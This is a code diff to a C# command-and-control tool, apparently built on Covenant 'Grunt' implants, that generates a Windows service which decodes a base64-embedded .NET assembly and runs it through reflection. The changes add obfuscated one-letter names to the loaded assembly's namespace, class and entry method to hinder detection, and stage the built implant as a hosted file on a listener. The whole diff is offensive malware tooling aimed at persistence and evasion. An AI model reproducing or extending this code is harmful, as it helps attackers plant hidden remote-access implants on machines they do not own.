@@ -27,7 +27,13 @@ namespace Scorpion.Jobs
   {
     public int DefaultTargetPort = 8080;
     public string DefaultServiceNamespace = "GService";
+
     public string DefaultServiceClassName = "GRunner";
+
+    public string DefaultObfuscatedServiceNamespace = "A";
+
+    public string DefaultObfuscatedServiceClassName = "A";
+    public string DefaultObfuscatedServiceStartMethod = "A";
 
     public string TargetDefaultHttpTemplate = "GruntHTTP";
     public string TargetDefaultSmbTemplate = "GruntSMB";
@@ -237,6 +243,8 @@ namespace Scorpion.Jobs
           hostedBin.Path = hostedUrlPath;
           hostedBin.Content = Convert.ToBase64String(File.ReadAllBytes(Path.Join(projDir, svcGuid + ".exe")));
           hostedBin = await request.CreateHostedFile((int)listener.Id, hostedBin);
+
+          File.Move(Path.Join(projDir, svcGuid + ".exe"), Path.Join(dataDir, svcGuid + ".exe"));
           Console.WriteLine($"Grunt generation complete for {svcGuid}");
 
         } else {
@@ -774,8 +782,8 @@ namespace {2}
 {{
     public partial class {3} : ServiceBase
     {{
-        public string TargetAssemblyName = ""{2}.{3}"";
-        public string TargetMethodName = ""Execute"";
+        public string TargetAssemblyName = ""{4}.{5}"";
+        public string TargetMethodName = ""{6}"";
 
         public {3}()
         {{
@@ -784,7 +792,7 @@ namespace {2}
 
         protected override void OnStart(string[] args)
         {{
-            byte[] data = System.Convert.FromBase64String(""{4}"");
+            byte[] data = System.Convert.FromBase64String(""{7}"");
             Assembly a = Assembly.Load(data);
             Type myType = a.GetType(TargetAssemblyName);
             MethodInfo myMethod = myType.GetMethod(TargetMethodName);
@@ -797,7 +805,7 @@ namespace {2}
         }}
     }}
 }}
-", aGuid, projDir, DefaultServiceNamespace, DefaultServiceClassName, bin64);
+", aGuid, projDir, DefaultServiceNamespace, DefaultServiceClassName, DefaultObfuscatedServiceNamespace, DefaultObfuscatedServiceClassName, DefaultObfuscatedServiceStartMethod, bin64);
       return content;
     }
 
